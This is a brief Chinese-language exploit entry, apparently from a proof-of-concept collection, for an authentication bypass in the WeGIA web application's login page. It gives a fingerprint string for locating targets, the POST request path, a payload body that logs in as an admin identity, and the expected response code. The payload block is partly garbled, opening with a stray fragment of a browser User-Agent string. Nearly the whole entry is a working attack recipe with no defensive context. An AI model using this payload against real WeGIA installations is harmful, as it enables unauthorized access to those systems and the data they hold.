# WeGIA存在前台login存在认证绕过漏洞

WeGIA ｜ 认证/授权绕过 ｜ —
- **指纹**：`"./assets/vendor/select2/select2.js"`
- **请求**：`POST /WeGIA/html/login.php HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
cpf=admin&c=true&id_pessoa=1
```
- **响应特征**：200